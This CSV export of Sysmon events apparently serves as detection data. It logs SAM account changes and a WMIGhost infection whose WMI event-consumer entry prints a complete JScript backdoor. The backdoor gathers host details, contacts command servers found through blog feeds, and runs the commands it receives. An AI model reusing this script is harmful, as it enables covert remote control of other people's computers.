58,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134403,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:45:30.650632400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:45:30.650,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
59,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134404,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:45:33.802858700Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:45:33.802,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
60,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134405,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:54:20.005437300Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:54:20.005,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
61,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134406,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:54:20.005776500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:20.005,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
62,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134407,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:54:22.974305100Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:22.973,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
63,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134408,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:54:22.974353600Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:22.973,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
64,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134409,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T11:00:13.713790400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:13.713,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
65,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134410,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T11:00:24.602481800Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:24.601,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
66,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134411,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T11:00:24.602530400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:24.601,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
67,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134412,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T11:02:16.084931900Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 11:02:16.084,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
68,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,1,7194,1828,372,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-04-03T18:11:54.098352000Z,5,"""C:\Users\user01\Desktop\WMIGhost.exe"" ",?,C:\Users\user01\Desktop\,?,?,"MD5=0DF40B226A4913A57668B83B7C7B443C,IMPHASH=8812FF21AEB160E8800257140ACAE54B",C:\Users\user01\Desktop\WMIGhost.exe,High,{365ABB72-F44E-5CA4-0000-00202BAF0A00},0x00000000000aaf2b,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-F456-5CA4-0000-001095090B00},3032,{365ABB72-F76A-5CA4-0000-0010FA0D1700},3328,?,,2,PC04\IEUser,2019-04-03 18:11:54.058,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
69,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,20,7195,1828,3164,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-04-03T18:11:54.178467200Z,3,,,,,,,,,,,,,,,,,,,,PC04\IEUser,2019-04-03 18:11:54.178,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""var sXmlUrl=\""http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\"";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\""%PCI%\\\"" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\""scrcons.exe\\\""'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');var re=/<title>@(.*)@<\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\''+commands[i].id+'\\':\\''+escape(result)+'\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();"""," ""ProbeScriptFint""",Modified,Script,,,,,,,,,,,,,
70,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,21,7197,1828,3164,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-04-03T18:11:54.198496000Z,3,,,,,,,,,,,,,,,,,,,,PC04\IEUser,2019-04-03 18:11:54.198,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Modified,," ""\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\""ProbeScriptFint\"""""," ""\\\\.\\root\\subscription:__EventFilter.Name=\""ProbeScriptFint\""""",,,,,,,,,,,
71,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,1,7203,1828,372,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-04-03T18:12:00.016862400Z,5,C:\Windows\system32\wbem\scrcons.exe -Embedding,Microsoft Corporation,C:\Windows\system32\,WMI Standard Event Consumer - scripting,6.1.7600.16385 (win7_rtm.090713-1255),"MD5=6AEC20B9D4C1AB6F1AB297F28EB6BF93,IMPHASH=CCEC86CC0D16062391CC627BC9466A62",C:\Windows\System32\wbem\scrcons.exe,System,{365ABB72-701F-5CA5-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-7020-5CA5-0000-0010ED6A0000},596,{365ABB72-F76F-5CA4-0000-0010AA201700},2636,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-04-03 18:11:59.996,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
